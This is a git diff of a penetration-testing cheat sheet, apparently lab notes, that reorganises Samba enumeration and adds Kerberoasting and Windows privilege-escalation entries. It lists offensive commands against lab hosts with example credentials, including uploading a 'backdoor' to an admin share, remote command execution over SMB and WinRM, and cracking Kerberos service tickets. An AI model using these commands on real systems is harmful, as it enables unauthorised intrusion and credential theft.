@@ -317,58 +317,6 @@ Here’s an example `web.xml` file.
 - SMB statistics (failed logins. errors etc..)
     - `nmap --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`
 
-#### **SAMBA**
-
-- Samba enumeration (all possible things)
-    - `enum4linux -e 10.10.18.135`
-
-- Samba version, workgroup name, 
-    - `nmap 192.213.18.3 -sV -p 445`
-    - `nmap --top-port 25 -sU --open 192.213.18.3 -sV`
-    - `use auxiliary/scanner/smb/smb_version`
-- Samba OS discovery, Netbios name,  computer name
-    - `nmap -p 445 192.213.18.3 --script smb-os-discovery`
-    - `rpcclient -U "" -N 192.230.148.3` > `srvinfo`
-    - `enum4linux -O 192.54.223.3 -p 445`
-    - `nmblookup -A 192.221.150.3`
-- Samba Anonymous connection
-    - `smbclient -L 192.221.150.3`
-    - `rpcclient -U "" -N 192.230.148.3`
-- Samba accessing shares by connection
-    - `smbclient //192.120.159.3/public - N`
-    - `smbclient //192.241.81.3/admin -U admin` 
-    - `smbclient //192.180.12.3/shawn -U admin` > `?`
-- Samaba listing users
-    - `nmap --script smb-enum-users --script-args smbusername=admin,smbpassword=password1 192.157.202.3`
-    - `use auxiliary/scanner/smb/smb_enumusers`
-    - `enum4linux -U 192.54.223.3 -p 445`
-    - `rpcclient -U "" -N 192.54.223.3` >`enumdomusers` 
-- Samba finding SID of admin
-    - `rpcclient -U "" -N 192.54.223.3` > `lookupnames admin`
-    - `enum4linux -r -u "admin" -p "password1" 192.241.81.3`
-- Samba finding domain groups
-    - `enum4linux -G  192.120.159.3`
-    - `rpcclient -U "" -N 192.120.159.3` > `enumdomgroups`
-- Samba listing shares and thrier permissions
-    - `nmap --script smb-enum-shares -script-args smbusername=admin,smbpassword=password1 192.54.233.3`
-    - `smbclient -L 192.221.150.3`
-    - `smbmap -u guest -p "" -d .  -H 10.5.26.125`
-    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125`
-    - `enum4linux -S  192.120.159.3`
-    - `use auxiliary/scanner/smb/smb_enumshares`
-- Samba listing content of shared drive
-    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -r 'C$'`
-    - `smbclient //192.120.159.3/public - N` > `ls`
-- Samba uploading file to network share
-    - `smbmap -u administrator -p smbserver_771 --upload '/root/backdoor' 'C$\backdoor' -H 10.5.24.17`
-- Samba downloaing file from network share
-    - `smbmap -u administrator -p smbserver_771 --download 'C$\flag.txt' -H 10.5.24.17`
-- Samba remote code execution
-    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -x 'ipconfig'`
-- Samba pipes available
-    - `use auxiliary/scanner/smb/pipe_auditor`
-- Samba printer configuration
-    - `enum4linux -I  192.120.159.3`
 
 
 
@@ -700,6 +648,61 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 
 #### SAMBA
 
+##### Enumeration
+
+- Samba enumeration (all possible things)
+    - `enum4linux -e 10.10.18.135`
+
+- Samba version, workgroup name, 
+    - `nmap 192.213.18.3 -sV -p 445`
+    - `nmap --top-port 25 -sU --open 192.213.18.3 -sV`
+    - `use auxiliary/scanner/smb/smb_version`
+- Samba OS discovery, Netbios name,  computer name
+    - `nmap -p 445 192.213.18.3 --script smb-os-discovery`
+    - `rpcclient -U "" -N 192.230.148.3` > `srvinfo`
+    - `enum4linux -O 192.54.223.3 -p 445`
+    - `nmblookup -A 192.221.150.3`
+- Samba Anonymous connection
+    - `smbclient -L 192.221.150.3`
+    - `rpcclient -U "" -N 192.230.148.3`
+- Samba accessing shares by connection
+    - `smbclient //192.120.159.3/public - N`
+    - `smbclient //192.241.81.3/admin -U admin` 
+    - `smbclient //192.180.12.3/shawn -U admin` > `?`
+- Samaba listing users
+    - `nmap --script smb-enum-users --script-args smbusername=admin,smbpassword=password1 192.157.202.3`
+    - `use auxiliary/scanner/smb/smb_enumusers`
+    - `enum4linux -U 192.54.223.3 -p 445`
+    - `rpcclient -U "" -N 192.54.223.3` >`enumdomusers` 
+- Samba finding SID of admin
+    - `rpcclient -U "" -N 192.54.223.3` > `lookupnames admin`
+    - `enum4linux -r -u "admin" -p "password1" 192.241.81.3`
+- Samba finding domain groups
+    - `enum4linux -G  192.120.159.3`
+    - `rpcclient -U "" -N 192.120.159.3` > `enumdomgroups`
+- Samba listing shares and thrier permissions
+    - `nmap --script smb-enum-shares -script-args smbusername=admin,smbpassword=password1 192.54.233.3`
+    - `smbclient -L 192.221.150.3`
+    - `smbmap -u guest -p "" -d .  -H 10.5.26.125`
+    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125`
+    - `enum4linux -S  192.120.159.3`
+    - `use auxiliary/scanner/smb/smb_enumshares`
+- Samba listing content of shared drive
+    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -r 'C$'`
+    - `smbclient //192.120.159.3/public - N` > `ls`
+- Samba uploading file to network share
+    - `smbmap -u administrator -p smbserver_771 --upload '/root/backdoor' 'C$\backdoor' -H 10.5.24.17`
+- Samba downloaing file from network share
+    - `smbmap -u administrator -p smbserver_771 --download 'C$\flag.txt' -H 10.5.24.17`
+- Samba remote code execution
+    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -x 'ipconfig'`
+- Samba pipes available
+    - `use auxiliary/scanner/smb/pipe_auditor`
+- Samba printer configuration
+    - `enum4linux -I  192.120.159.3`
+
+##### Exploitation
+
 - Samba listing users
     - `nmap --script smb-enum-users --script-args smbusername=admin,smbpassword=password1 192.157.202.3`
     - `use auxiliary/scanner/smb/smb_enumusers`
@@ -767,6 +770,8 @@ smb: \> mget *
 - Connecting RDP
     - `xfreerdp /u:administrator /p:qwertyuiop /v:10.5.31.78:3333`
 
+
+
 #### WinRM
 
 - Arbitiary command execution
@@ -776,8 +781,20 @@ smb: \> mget *
     - `evil-winrm.rb -u administrator -p tinkerbell -i 10.5.27.211`
     - `use windows/winrm/winrm_script_exec` > `set RHOSTS 10.5.27.211` > `set RPORT 5985` > `set USERNAME administrator` > `set PASSWORD tinkerbell` > `set FORCE_VBS true` > `exploit`
 
-#### WinRM
 
+
+#### Active Directory
+
+##### Enumeration
+
+##### Exploitation
+###### Kerberosting
+
+- Checking if user is kerberostable, ie if user has SPN or not
+    - `impacket-GetUserSPNs 'LAB.ENTERPRISE.THM/nik:ToastyBoi!' -dc-ip 10.10.130.255 -request`
+
+- Crack the service ticket hash if found
+    - `hashcat -m 13100  -a 0 hash ~/Downloads/rockyou.txt`
 
 ### [Windows Post Exploitation Enumeration](#)
 
@@ -889,10 +906,16 @@ smb: \> mget *
 
 ### [Windows Privilege Escalation](#)
 
-**Privilege Escalation by Kernel Exploits**
+#### Find Possible Privilege Escalation**
+###### Exploit Suggestor
 
 - Finding Kernel exploit by using `Exploit Suggestor` on metasploit
     - `search exploit_suggest` > `multi/recon/local_exploit_suggester` > `set SESSION 1` > `exploit`
+
+###### WinPeas
+
+- Download WinPeas
+    - `https://github.com/carlospolop/PEASS-ng/releases/download/20230101/winPEASx64.exe`
 
 **Privilege Escalation by Bypassing UAC prompt**
 
